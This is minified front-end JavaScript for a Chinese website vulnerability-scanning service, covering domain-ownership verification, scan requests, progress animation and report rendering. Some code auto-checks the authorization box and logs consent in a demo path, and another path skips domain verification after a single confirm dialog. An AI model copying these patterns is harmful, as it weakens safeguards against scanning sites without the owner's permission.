Wr(e){try{if(!ve()){F("请先登录后再使用"),_e("profile");return}let i=document.getElementById("scan-url");i&&(i.value=e);let t=document.getElementById("auth-check-step1");t&&!t.checked&&(t.checked=!0,t.dispatchEvent(new Event("change")));try{let r=new Date().toISOString();localStorage.setItem("vs_auth_checked_at",r),ue("/api/scan-auth-log",{method:"POST",body:JSON.stringify({authorized_at:r})}).catch(function(){})}catch{}gi()}catch(i){console.error("quickDemo error:",i),F("启动扫描失败："+(i.message||String(i)),"error")}}function Zr(){window._publicReportResult&&$t(window._publicReportResult)}function Vr(){let e=document.getElementById("scan-url"),i=e?e.value.trim():"";if(!i){F("请输入目标网址");return}/^https?:\/\//i.test(i)||(i="https://"+i,e&&(e.value=i));try{let v=new URL(i).hostname.toLowerCase();if(!v){F("网址格式不正确，请输入完整域名（如 example.com）");return}let d=/^(\d{1,3}\.){3}\d{1,3}$/.test(v)||v.indexOf(":")>=0,f=v==="localhost",h=v.indexOf(".")>=0;if(!d&&!f&&!h){F("网址格式不正确，请输入完整域名（如 example.com）或 IP 地址");return}}catch{F("网址格式不正确，请输入有效的 URL");return}gt="vs-"+Math.random().toString(36).substring(2,10)+"-"+Date.now().toString(36);let t=Qe(i),r=document.getElementById("verify-token"),s=document.getElementById("dns-record"),o=document.getElementById("verify-step-1"),a=document.getElementById("verify-step-2"),n=document.getElementById("verify-method-info"),c=document.getElementById("verify-confirm-btn");r&&(r.textContent=gt),s&&(s.textContent="_vuln-sentinel."+t+' TXT "'+gt+'"'),o&&(o.style.display="none"),a&&(a.style.display="block"),jt="",n&&(n.innerHTML="<p>请选择一种验证方式</p>"),c&&(c.disabled=!0)}function Xr(e,i){jt=i,document.querySelectorAll(".verify-method").forEach(function(s){s.classList.remove("selected")}),e&&e.classList.add("selected");let t=document.getElementById("verify-method-info");t&&(i==="dns"?t.innerHTML="<p>已选择 DNS TXT 验证。请在域名 DNS 管理中添加 TXT 记录后点击确认。</p>":t.innerHTML="<p>已选择网站文件验证。请在网站根目录创建验证文件后点击确认。</p>");let r=document.getElementById("verify-confirm-btn");r&&(r.disabled=!1)}function Gr(){if(!ve()){F("请先登录"),_e("profile");return}let e=document.getElementById("scan-url"),i=e?e.value.trim():"";if(!i){F("请输入目标网址");return}if(/^https?:\/\//i.test(i)||(i="https://"+i,e&&(e.value=i)),!confirm(`跳过域名归属验证将直接进入扫描阶段。该选项仅适用于您已确认拥有该目标网站或正在测试环境使用的场景。

继续吗？`))return;let t=document.getElementById("scan-url-confirmed");t&&(t.value=i);let r=document.getElementById("auth-check");r&&(r.checked=!0),at();let s=document.getElementById("verify-step-2"),o=document.getElementById("verify-step-3");s&&(s.style.display="none"),o&&(o.style.display="block"),F("已跳过验证，进入快速扫描")}function Jr(){if(!jt){F("请先选择验证方式");return}if(!ve()){F("请先登录"),_e("profile");return}let e=document.getElementById("verify-confirm-btn"),i=document.getElementById("scan-url"),t=i?i.value.trim():"";if(!t){F("请输入目标网址");return}/^https?:\/\//i.test(t)||(t="https://"+t,i&&(i.value=t)),e&&(e.disabled=!0,e.textContent="正在查询 DNS / 下载验证文件..."),ue("/api/verify",{method:"POST",body:JSON.stringify({url:t,token:gt,method:jt})}).then(function(r){return r.json()}).then(function(r){if(e&&(e.disabled=!1,e.textContent="我已添加验证信息，确认验证"),r.success){let s=document.getElementById("scan-url-confirmed");s&&(s.value=t);let o=document.getElementById("auth-check");o&&(o.checked=!0);try{at()}catch{}let a=document.getElementById("verify-step-2"),n=document.getElementById("verify-step-3");a&&(a.style.display="none"),n&&(n.style.display="block"),F("验证通过："+(r.message||""))}else{F("验证失败："+(r.message||"未找到验证信息"),"error");let s=document.getElementById("verify-method-info");s&&(s.innerHTML='<p style="color:var(--danger)">'+E(r.message||"验证失败")+"</p>")}}).catch(function(r){e&&(e.disabled=!1,e.textContent="我已添加验证信息，确认验证"),F("验证请求失败："+r.message,"error")})}function Kr(){ht(gt),F("Token 已复制")}function Yr(e,i,t){let r=100;return e.forEach(function(s){s.level==="高风险"?r-=18:s.level==="中风险"?r-=10:s.level==="低风险"&&(r-=4)}),i&&(r+=12),t&&(r+=10),Math.max(10,Math.min(98,r))}function hi(){try{if(ye){F("扫描进行中，请稍候");return}if(!ve()){F("请先登录后再使用扫描功能"),_e("profile");return}ye=!0,ge("scan-btn",!0);let e=document.getElementById("auth-check");if(!(e?e.checked:!1)){ye=!1,ge("scan-btn",!1),F("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}try{let v=new Date().toISOString();localStorage.setItem("vs_auth_checked_at",v),ue("/api/scan-auth-log",{method:"POST",body:JSON.stringify({authorized_at:v})}).catch(function(){})}catch{}let t=document.getElementById("scan-url-confirmed"),r=t?t.value.trim():"";if(!r){let v=document.getElementById("scan-url");r=v?v.value.trim():"",r&&t&&(t.value=r)}if(!r){ye=!1,ge("scan-btn",!1),F("请输入有效网址");return}/^https?:\/\//i.test(r)||(r="https://"+r);try{let d=new URL(r).hostname.toLowerCase();if(!d){ye=!1,ge("scan-btn",!1),F("网址格式不正确，请输入完整域名（如 example.com）");return}let f=/^(\d{1,3}\.){3}\d{1,3}$/.test(d)||d.indexOf(":")>=0,h=d==="localhost",m=d.indexOf(".")>=0;if(!f&&!h&&!m){ye=!1,ge("scan-btn",!1),F("网址格式不正确，请输入完整域名（如 example.com）或 IP 地址");return}}catch{ye=!1,ge("scan-btn",!1),F("网址格式不正确，请输入有效的 URL");return}let s=Qe(r);_e("result");let o='<div class="report-header fade-in-up"><div style="font-size:48px;margin-bottom:16px"></div><h2 style="margin-bottom:8px;font-size:clamp(16px,5vw,22px)">正在扫描 '+E(s)+`</h2><p style="color:var(--text-lighter);font-size:13px;margin-bottom:20px">安全扫描引擎正在执行目标扫描...</p><div style="max-width:min(320px,90vw);margin:0 auto 20px;background:rgba(255,255,255,0.1);border-radius:2px;height:8px;overflow:hidden"><div id="scan-progress-bar" style="height:100%;background:linear-gradient(90deg,#4b6eaf,#818cf8);width:5%;border-radius:2px;transition:width 0.3s"></div></div><div id="scan-progress-text" style="font-size:12px;color:var(--text-lighter)">正在初始化扫描引擎...</div><button onclick="cancelScan()" style="margin-top:20px;padding:10px 24px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;cursor:pointer;font-size:13px;font-weight:500;transition:background 0.15s" onmouseover="this.style.background='rgba(199,84,80,0.25)'" onmouseout="this.style.background='rgba(199,84,80,0.15)'"> 取消扫描</button></div>`,a=document.getElementById("result-content");a&&(a.innerHTML=o);let n=document.querySelector('input[name="scan-depth"]:checked'),g=(n&&n.value||"standard")==="deep";tn(r,s,g)}catch(e){console.error("startScan error:",e),ye=!1,ge("scan-btn",!1);let i=document.getElementById("result-content");i?i.innerHTML='<div class="card" style="text-align:center;padding:40px 20px"><div style="font-size:48px;margin-bottom:12px">错误：</div><h3 style="color:var(--danger);margin-bottom:8px">扫描启动失败</h3><p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">页面在启动扫描时遇到问题。</p><p style="color:var(--text-lighter);font-size:12px;margin-bottom:16px">错误信息：'+E(e.message||String(e))+`</p><button class="btn btn-primary" onclick="navigateTo('home')"> 返回首页</button></div>`:F("扫描启动失败："+(e.message||String(e)),"error")}}function Qr(){ye&&(Te=!0,ye=!1,ge("scan-btn",!1),typeof je=="function"&&je(),typeof ii=="function"&&ii(),F("扫描已取消"),setTimeout(function(){_e("home"),Te=!1},300))}function tn(e,i,t){nn();let s=setTimeout(function(){Te||(je(),setTimeout(function(){Te||(zt("扫描超时，目标网站可能响应缓慢或无法访问。请检查网址是否正确，或稍后重试。",e),ye=!1,ge("scan-btn",!1))},600))},t?12e4:6e4);ue("/api/scan",{method:"POST",body:JSON.stringify({url:e,depth:t?"deep":"standard",authorized:!0})}).then(function(o){if(!Te)return clearTimeout(s),o.json().then(function(a){return a._status=o.status,a}).catch(function(){throw new Error("服务器返回异常（HTTP "+o.status+"），请稍后重试")})}).then(function(o){if(!Te){if(clearTimeout(s),Dt(o)){je(),setTimeout(function(){if(Te)return;F(Rt(o),"error");let a=document.getElementById("result-content");a&&(a.innerHTML='<div class="card" style="text-align:center;padding:36px 20px"><div style="font-size:44px;margin-bottom:12px">额度不足</div><h3 style="margin:0 0 8px;color:var(--warning)">当前额度不够继续扫描</h3><p style="color:var(--text-secondary);font-size:13px;line-height:1.7;margin:0 0 16px">'+E(Rt(o))+`</p><button class="btn btn-primary" onclick="navigateTo('billing')">去充值</button> <button class="btn btn-secondary" onclick="navigateTo('profile')">查看额度</button></div>`),Pe(),ye=!1,ge("scan-btn",!1)},600);return}if(o._status&&o._status>=400){je(),setTimeout(function(){if(Te)return;let a=Ne(o);o._status===403?a=a+`

如需扫描自有域名，请先完成域名归属验证。`:o._status===429&&(a="扫描请求过于频繁，请等待 1 分钟后重试。"),zt(a,e),ye=!1,ge("scan-btn",!1)},600);return}if(o.error){je(),setTimeout(function(){Te||(zt(Ne(o),e),ye=!1,ge("scan-btn",!1))},600);return}je(),setTimeout(function(){if(Te)return;let a=es(e,o);ce=a,dn(),$t(a),ye=!1,ge("scan-btn",!1),Pe()},400)}}).catch(function(o){Te||(clearTimeout(s),je(),setTimeout(function(){if(Te)return;let a=o&&o.message?o.message:"扫描服务连接失败，请检查网络或稍后重试";zt(a,e),ye=!1,ge("scan-btn",!1)},600))})}function es(e,i){let t=Qe(e);i=i||{};let r=Array.isArray(i.findings)?i.findings:[];r.forEach(function(n){if(n.severity&&!n.level_zh){let c={high:"高风险",medium:"中风险",low:"低风险",critical:"严重"};n.level_zh=c[n.severity]||"低风险",n.level=n.level_zh}});let s=i.score,o=i.risk_level,a={summary:"对 "+t+" 的真实安全扫描已完成。共发现 "+r.length+" 个安全问题，综合安全评分为 "+s+" 分（满分 100）。",priority:r.length>0?'优先修复标记为"高风险"的安全问题。':"安全状况良好，建议持续监控。",boundary:"本次检测基于真实 HTTP 响应头判断。"};return{url:e,time:new Date().toLocaleString("zh-CN"),score:s,risk_level:o,scan_mode:"real",scan_id:i.scan_id||null,ai_report:a,owasp_coverage:i.owasp_coverage||[],findings:r,header_details:i.header_details||[],info_leaks:i.info_leaks||[],cors:i.cors||null,cookie_issues:i.cookie_issues||[],raw_headers:i.raw_headers||{},is_https:i.is_https!==!1,restricted:i.restricted||!1,restricted_reason:i.restricted_reason||"",restricted_code:i.restricted_code||"",redirected:i.redirected||!1,redirect_reason:i.redirect_reason||"",headers:i.headers||i.raw_headers||{},waf:i.waf||(i.waf_list&&i.waf_list[0]?i.waf_list[0].name:null),ssl:i.ssl||i.ssl_info||{},duration_ms:i.duration_ms||0,report_share_id:i.report_share_id||null,discovered_at:r.length>0&&r[0].discovered_at?r[0].discovered_at:new Date().toISOString()}}function zt(e,i){let t=document.getElementById("result-content");if(!t)return;let r=E(i),s=/login|redirect|spm|havana|sso|auth|signin/i.test(i),o=i.length>80,a="";try{let h=new URL(i);a=h.protocol+"//"+h.hostname}catch{}let n=e&&(e.indexOf("无法解析")!==-1||e.indexOf("DNS")!==-1);if(e&&e.indexOf("超时"),e&&e.indexOf("无法连接"),e&&(e.indexOf("域名归属验证")!==-1||e.indexOf("域名验证")!==-1)){let h='<div class="card" style="padding:24px;background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.3);border-radius:2px;text-align:center;max-width:600px;margin:0 auto;">';h+='<div style="font-size:14px;font-weight:600;color:#4b6eaf;margin-bottom:12px">安全登录</div>',h+='<h3 style="margin:0 0 8px;color:#4b6eaf">深度扫描需要域名归属验证</h3>',h+='<p style="color:var(--text-secondary);margin:0 0 20px;font-size:14px;line-height:1.6">'+E(e)+"</p>",h+='<p style="color:var(--text-secondary);margin:0 0 20px;font-size:13px">为了符合安全要求，深度扫描（爬虫 + 漏洞探测）需要先证明您拥有该域名。</p>',h+='<div style="display:flex;gap:12px;justify-content:center;flex-wrap:wrap">',h+=`<button onclick="document.getElementById('scan-url').value='`+r+`'; goVerifyStep2();" class="btn-primary" style="padding:10px 20px;border-radius:2px;border:none;background:#4b6eaf;color:white;cursor:pointer;font-size:14px">立即验证域名</button>`,h+=`<button onclick="startScanDirect('`+r+`', false)" class="btn-secondary" style="padding:10px 20px;border-radius:2px;border:1px solid var(--border);background:transparent;color:var(--text-primary);cursor:pointer;font-size:14px">改用普通扫描</button>`,h+="</div></div>",t.innerHTML=h;return}let g="无法完成扫描",v=e,d=["&#x2022; 目标站点可能拒绝自动化请求（反爬机制）","&#x2022; 目标需要登录或身份认证","&#x2022; 当前 URL 是跳转/登录链接，不是主站","&#x2022; 网站设置了访问限制（如 IP 黑名单）","&#x2022; 网站已下线或服务器故障"];n&&(g="域名无法解析",d=["&#x2022; 网址拼写错误，或域名尚未注册","&#x2022; DNS 服务器暂时无法解析","&#x2022; 本地网络 DNS 配置问题"]);let f='<div class="report-header fade-in-up">';f+='<div style="margin-bottom:12px">',f+='<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">扫描失败</span>',f+="</div>",f+='<div class="score-ring-wrap">',f+='<div class="score-ring" style="background:#3c3f41">',f+='<div class="score-value" style="color:#fff">--</div>',f+='<div class="score-label" style="color:rgba(255,255,255,0.7)">无法评分</div>',f+="</div></div>",f+='<div class="report-url">'+r+"</div>",f+='<div class="report-time">'+new Date().toLocaleString("zh-CN")+"</div>",f+='<span class="risk-badge high">无法扫描</span>',f+="</div>",f+='<div class="card fade-in-up" style="animation-delay:0.1s;text-align:center;padding:40px 20px">',f+='<div style="font-size:48px;margin-bottom:16px"></div>',f+='<h3 style="margin-bottom:12px;color:var(--danger)">'+g+"</h3>",f+='<p style="color:var(--text-light);margin-bottom:20px;max-width:400px;margin-left:auto;margin-right:auto">'+E(v)+"</p>",(s||o)&&(f+='<div style="background:rgba(240,167,50,0.1);border:1px solid rgba(240,167,50,0.3);border-radius:var(--radius-sm);padding:16px;text-align:left;font-size:13px;color:var(--text-secondary);line-height:2;margin-bottom:16px">',f+="<p><strong>提示： 检测到登录/跳转长链接</strong></p>",f+="<p>建议扫描网站主域名，而不是登录页或跳转链接。</p>",a&&(f+='<div style="margin-top:10px;text-align:center">',f+=`<button class="btn btn-primary" onclick="retryScanWithUrl('`+E(a)+`')" style="font-size:13px"> 改扫主域名：`+E(a)+"</button>",f+="</div>"),f+="</div>"),f+='<div style="background:var(--bg);border-radius:var(--radius-sm);padding:16px;text-align:left;font-size:13px;color:var(--text-secondary);line-height:2">',f+="<p><strong>可能的原因：</strong></p>",d.forEach(function(h){f+="<p>"+h+"</p>"}),f+="</div>",f+='<div style="margin-top:20px;text-align:left;border-top:1px solid var(--border);padding-top:20px">',f+='<label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">修改网址重新扫描：</label>',f+='<div style="display:flex;gap:8px">',f+='<input id="retry-url-input" type="url" value="'+r+'" style="flex:1;padding:10px 14px;border:2px solid var(--border);border-radius:2px;font-size:14px;outline:none" />',f+='<button class="btn btn-primary" onclick="retryScan()" style="white-space:nowrap"> 重试</button>',f+="</div>",f+='<div style="margin-top:12px;text-align:center">',f+='<button onclick="backToScanInput()" style="background:none;border:none;color:var(--primary);font-size:13px;cursor:pointer"><- 返回修改网址</button>',f+="</div></div>",f+="</div>",t.innerHTML=f,_e("result")}function ts(e){ye=!1,ge("scan-btn",!1);let i=document.getElementById("scan-url");i&&(i.value=e),hi()}function is(){ye=!1,ge("scan-btn",!1);let e=document.getElementById("verify-step-1"),i=document.getElementById("verify-step-2"),t=document.getElementById("verify-step-3");e&&(e.style.display="block"),i&&(i.style.display="none"),t&&(t.style.display="none");let r=document.getElementById("result-content");r&&(r.innerHTML=""),_e("scan")}function ns(){ye=!1,ge("scan-btn",!1);let e=document.getElementById("retry-url-input");if(!e)return;let i=e.value.trim();if(!i){F("请输入有效网址");return}let t=document.getElementById("auth-check");if(!t||!t.checked){F("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}/^https?:\/\//i.test(i)||(i="https://"+i),e.value=i;let r=Qe(i),s=document.getElementById("result-content");if(!s)return;let a=[{id:"dns",label:"DNS 解析",detail:r},{id:"connect",label:"TCP 连接",detail:"443/80 端口"},{id:"headers",label:"响应头判断",detail:"9 项安全头"},{id:"ssl",label:"SSL 证书检查",detail:"证书链/有效期"},{id:"sensitive",label:"敏感路径扫描",detail:"12 个路径"},{id:"waf",label:"WAF 识别",detail:"6 类厂商指纹"},{id:"report",label:"生成报告",detail:"评分/修复建议"}].map(function(v,d){return'<div id="stage-'+v.id+'" class="scan-stage" style="display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:2px;margin-bottom:6px;opacity:0.4;transition:all 0.3s"><div class="stage-icon" style="width:24px;height:24px;border-radius:50%;background:rgba(75,110,175,0.15);display:flex;align-items:center;justify-content:center;font-size:12px;color:#a5b4fc">...</div><div style="flex:1"><div style="font-size:13px;font-weight:600">'+v.label+'</div><div style="font-size:11px;color:var(--text-secondary)">'+v.detail+'</div></div><div class="stage-status" style="font-size:11px;color:var(--text-secondary)">等待</div></div>'}).join(""),n='<div class="report-header fade-in-up"><div style="position:relative;height:160px;margin-bottom:16px;display:flex;align-items:center;justify-content:center"><div id="scan-3d-orbit" style="position:relative;width:140px;height:140px"><div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(75,110,175,0.3);animation:spin 3s linear infinite"></div><div style="position:absolute;inset:14px;border-radius:50%;border:2px solid rgba(168,85,247,0.4);animation:spin 2s linear infinite reverse"></div><div style="position:absolute;inset:28px;border-radius:50%;border:2px solid rgba(115,201,144,0.3);animation:spin 4s linear infinite"></div><div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(75,110,175,0.4);animation:pulse-ring 2s ease-out infinite"></div><div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(168,85,247,0.3);animation:pulse-ring 2s ease-out infinite 0.6s"></div><div id="scan-3d-core" style="position:absolute;inset:42px;border-radius:50%;background:radial-gradient(circle,rgba(75,110,175,0.7),rgba(75,110,175,0.15));display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;box-shadow:0 0 30px rgba(75,110,175,0.5)"><span id="scan-percent" style="font-size:26px;font-weight:800;line-height:1">0%</span><span style="font-size:9px;opacity:0.8;margin-top:2px">扫描中</span></div></div></div><div style="max-width:min(420px,calc(100% - 32px));margin:0 auto 16px"><div style="height:6px;background:rgba(255,255,255,0.1);border-radius:3px;overflow:hidden"><div id="scan-main-progress" style="height:100%;width:0%;background:#3c3f41;border-radius:3px;transition:width 0.5s ease;box-shadow:0 0 10px rgba(75,110,175,0.5)"></div></div></div><div id="scan-live-text" style="height:20px;font-size:12px;color:#a5b4fc;margin-bottom:14px;text-align:center;overflow:hidden;transition:all 0.3s"><span style="display:inline-block;animation:scan-text-glow 1.5s ease-in-out infinite">正在初始化扫描引擎...</span></div><h2 style="margin-bottom:6px;font-size:clamp(16px,5vw,20px)">正在扫描 '+E(r)+'</h2><p style="color:var(--text-lighter);font-size:12px;margin-bottom:18px">安全扫描引擎 · 7 阶段实时扫描中</p><div style="max-width:min(420px,calc(100% - 32px));margin:0 auto;text-align:left">'+a+`</div><button onclick="cancelScan()" style="margin-top:20px;padding:10px 24px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;cursor:pointer;font-size:13px;font-weight:600;transition:all 0.2s" onmouseover="this.style.background='rgba(199,84,80,0.25)'" onmouseout="this.style.background='rgba(199,84,80,0.15)'"> 取消扫描</button></div><style>@keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}@keyframes pulse-ring{0%,100%{transform:scale(1);opacity:1}}@keyframes scan-text-glow{0%,100%{opacity:1}}</style>`;s.innerHTML=n,rn();let g=((document.querySelector('input[name="scan-depth"]:checked')||{}).value||"standard")==="deep";tn(i,r,g)}function Ht(e,i){let t=document.getElementById("stage-"+e);if(!t)return;t.style.opacity="1";let r=t.querySelector(".stage-icon"),s=t.querySelector(".stage-status");i==="running"?(t.style.background="rgba(75,110,175,0.12)",t.style.borderColor="rgba(75,110,175,0.4)",r.style.background="rgba(75,110,175,0.4)",r.style.color="#fff",r.innerHTML="刷新",r.style.animation="spin 1s linear infinite",s.innerHTML='<span style="color:#a5b4fc">扫描中</span>'):i==="done"?(t.style.background="rgba(115,201,144,0.1)",t.style.borderColor="rgba(115,201,144,0.3)",r.style.background="rgba(115,201,144,0.3)",r.style.color="#73c990",r.style.animation="none",r.innerHTML="",s.innerHTML='<span style="color:#73c990">完成</span>'):i==="fail"&&(t.style.background="rgba(199,84,80,0.1)",t.style.borderColor="rgba(199,84,80,0.3)",r.style.background="rgba(199,84,80,0.3)",r.style.color="#c75450",r.style.animation="none",r.innerHTML="",s.innerHTML='<span style="color:#c75450">失败</span>')}function nn(){let e=["dns","connect","headers","ssl","sensitive","waf","report"],i=0;Fe&&(clearInterval(Fe),Fe=null);function t(){i>0&&i<=e.length&&Ht(e[i-1],"done"),i<e.length?(Ht(e[i],"running"),i++):(clearInterval(Fe),Fe=null)}t(),Fe=setInterval(t,700)}function je(){Fe&&(clearInterval(Fe),Fe=null),["dns","connect","headers","ssl","sensitive","waf","report"].forEach(function(i){Ht(i,"done")}),sn(100,"扫描完成，正在生成报告...")}function rn(){Ie=0,Et=0,Le&&(clearInterval(Le),Le=null),Ce&&(Ce.forEach(function(i){clearTimeout(i)}),Ce=[]);let e=0;Le=setInterval(function(){Ie<30?e+=Math.random()*5+2:Ie<60?e+=Math.random()*3+1:Ie<85?e+=Math.random()*2+.5:e+=Math.random()*.8+.2,e=Math.min(e,95),Ie<e&&(Ie+=(e-Ie)*.3,Ie=Math.min(Ie,95));let i=document.getElementById("scan-main-progress"),t=document.getElementById("scan-percent");if(i&&(i.style.width=Math.round(Ie)+"%"),t&&(t.textContent=Math.round(Ie)+"%"),Math.random()<.15&&Et<Bi.length-1){Et++;let r=document.getElementById("scan-live-text");if(r){r.style.opacity="0";let s=setTimeout(function(){if(!Le)return;let o=r.querySelector("span");o&&(o.textContent=Bi[Et]),r.style.opacity="1"},200);Ce||(Ce=[]),Ce.push(s)}}},200)}function ii(){Le&&(clearInterval(Le),Le=null),Ce&&(Ce.forEach(function(e){clearTimeout(e)}),Ce=[])}function sn(e,i){Ie=e;let t=document.getElementById("scan-main-progress"),r=document.getElementById("scan-percent");if(t&&(t.style.width=e+"%"),r&&(r.textContent=Math.round(e)+"%"),i){let s=document.getElementById("scan-live-text");if(s){let o=s.querySelector("span");o&&(o.textContent=i)}}e>=100&&(Le&&(clearInterval(Le),Le=null),Ce&&(Ce.forEach(function(s){clearTimeout(s)}),Ce=[]))}function on(e){let i=[{name:"安全响应头",score:0},{name:"SSL/TLS",score:0},{name:"敏感文件",score:0},{name:"WAF 防护",score:0},{name:"漏洞检测",score:0}],t=e.findings||[];t.forEach(function(d){let f=(d.name||"").toLowerCase(),h=(d.owasp||"").toLowerCase();(f.indexOf("安全响应头")>=0||f.indexOf("响应头")>=0||h.indexOf("a05")>=0)&&(i[0].score=Math.max(i[0].score,d.level==="高风险"?30:d.level==="中风险"?60:80)),(f.indexOf("https")>=0||f.indexOf("ssl")>=0||f.indexOf("tls")>=0||f.indexOf("证书")>=0)&&(i[1].score=Math.max(i[1].score,d.level==="高风险"?30:d.level==="中风险"?60:80)),(f.indexOf("敏感文件")>=0||f.indexOf(".env")>=0||f.indexOf(".git")>=0||f.indexOf("暴露")>=0)&&(i[2].score=Math.max(i[2].score,d.level==="高风险"?30:d.level==="中风险"?60:80)),(f.indexOf("waf")>=0||f.indexOf("防火墙")>=0)&&(i[3].score=Math.max(i[3].score,d.level==="高风险"?30:d.level==="中风险"?60:80)),(f.indexOf("注入")>=0||f.indexOf("xss")>=0||f.indexOf("sql")>=0||f.indexOf("csrf")>=0)&&(i[4].score=Math.max(i[4].score,d.level==="高风险"?30:d.level==="中风险"?60:80))});let r=t.length>0;i.forEach(function(d){d.score===0&&(d.score=r?85:95)});let s=150,o=150,a=110,n=i.length,c=[],g='<svg viewBox="0 0 300 300" style="max-width:300px;margin:0 auto;display:block" aria-label="安全维度雷达图">';for(let d=1;d<=5;d++){let f=a*d/5,h=[];for(let m=0;m<n;m++){let u=-Math.PI/2+m*2*Math.PI/n;h.push((s+f*Math.cos(u)).toFixed(1)+","+(o+f*Math.sin(u)).toFixed(1))}g+='<polygon points="'+h.join(" ")+'" fill="none" stroke="rgba(75,110,175,0.15)" stroke-width="1"/>'}for(let d=0;d<n;d++){let f=-Math.PI/2+d*2*Math.PI/n;g+='<line x1="'+s+'" y1="'+o+'" x2="'+(s+a*Math.cos(f)).toFixed(1)+'" y2="'+(o+a*Math.sin(f)).toFixed(1)+'" stroke="rgba(75,110,175,0.2)" stroke-width="1"/>'}let v=[];for(let d=0;d<n;d++){let f=-Math.PI/2+d*2*Math.PI/n,h=a*i[d].score/100;v.push((s+h*Math.cos(f)).toFixed(1)+","+(o+h*Math.sin(f)).toFixed(1)),c.push({x:s+h*Math.cos(f),y:o+h*Math.sin(f),name:i[d].name,score:i[d].score})}return g+='<polygon points="'+v.join(" ")+'" fill="rgba(75,110,175,0.35)" stroke="#4b6eaf" stroke-width="2"/>',c.forEach(function(d){g+='<circle cx="'+d.x.toFixed(1)+'" cy="'+d.y.toFixed(1)+'" r="4" fill="#4b6eaf" stroke="#bbbbbb" stroke-width="1.5"/>'}),c.forEach(function(d,f){let h=-Math.PI/2+f*2*Math.PI/n,m=s+(a+22)*Math.cos(h),u=o+(a+22)*Math.sin(h),y=m<s-5?"end":m>s+5?"start":"middle";g+='<text x="'+m.toFixed(1)+'" y="'+u.toFixed(1)+'" text-anchor="'+y+'" dominant-baseline="middle" font-size="11" font-weight="600" fill="currentColor">'+E(d.name)+" "+d.score+"</text>"}),g+="</svg>",g}function $t(e){try{if(tr(e)){hr(),_e("result"),ir(e),ce=e,dn(e);return}e=e||{},e.findings=Array.isArray(e.findings)?e.findings:[],e.owasp_coverage=Array.isArray(e.owasp_coverage)?e.owasp_coverage:[],e.header_details=Array.isArray(e.header_details)?e.header_details:[],e.info_leaks=Array.isArray(e.info_leaks)?e.info_leaks:[],e.cookie_issues=Array.isArray(e.cookie_issues)?e.cookie_issues:[],e.waf=Array.isArray(e.waf)?e.waf:[],e.sensitive_paths=Array.isArray(e.sensitive_paths)?e.sensitive_paths:[],e.crawled_pages=Array.isArray(e.crawled_pages)?e.crawled_pages:[],e.vuln_tests=Array.isArray(e.vuln_tests)?e.vuln_tests:[],e.score_breakdown=Array.isArray(e.score_breakdown)?e.score_breakdown:[],e.owasp_coverage=Array.isArray(e.owasp_coverage)?e.owasp_coverage:[],e.ai_report=e.ai_report&&typeof e.ai_report=="object"?e.ai_report:{summary:"扫描完成",priority:"暂无优先事项"},e.score=typeof e.score=="number"?e.score:parseInt(e.score,10)||0,e.score=Math.max(0,Math.min(100,e.score)),e.raw_headers=e.raw_headers&&typeof e.raw_headers=="object"?e.raw_headers:{};let i=0,t=0,r=0;e.findings.forEach(function(l){l.level==="高风险"?i++:l.level==="中风险"?t++:r++});let s=e.score<50?"high":e.score<75?"medium":"low",o=Lt(e.score),a=Pt(e.score),n="";n+='<div class="report-header fade-in-up">',n+='<div style="margin-bottom:12px">',e.restricted?n+='<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(240,167,50,0.15);color:#f0a732;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">受限扫描报告</span>':n+='<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(115,201,144,0.15);color:#73c990;border:1px solid rgba(115,201,144,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">真实扫描</span>',n+="</div>",e.tls_verify_skipped&&(n+='<div style="background:rgba(199,84,80,0.08);border:1px solid rgba(199,84,80,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#c75450;line-height:1.6">',n+="<strong>诊断模式</strong><br/>",n+="当前扫描跳过了 TLS 证书验证，结果仅供诊断参考。生产环境建议开启 TLS_VERIFY=true。",n+="</div>"),e.restricted?(n+='<div style="background:rgba(240,167,50,0.08);border:1px solid rgba(240,167,50,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#f0a732;line-height:1.6">',n+="<strong>受限扫描报告</strong><br/>",n+="目标可访问，但存在登录/WAF/反爬限制（HTTP "+(e.restricted_code||"")+"），<br/>",n+="本次为受限扫描，部分结果需要人工确认。",n+="</div>"):e.restricted_reason&&(n+='<div style="background:rgba(240,167,50,0.08);border:1px solid rgba(240,167,50,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#f0a732;line-height:1.6">',n+="<strong>受限访问提示</strong><br/>"+E(e.restricted_reason),n+="</div>"),e.redirected&&(n+='<div style="background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#4b6eaf;line-height:1.6">',n+='<div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">',n+="<div><strong>跳转提示</strong><br/>",n+=E(e.redirect_reason||"目标发生跳转，建议扫描最终目标地址。"),n+="</div>",n+=`<button onclick="scanRedirectTarget()" style="background:rgba(59,130,246,0.15);color:#4b6eaf;border:1px solid rgba(59,130,246,0.3);padding:6px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;white-space:nowrap;transition:background 0.15s" onmouseover="this.style.background='rgba(59,130,246,0.25)'" 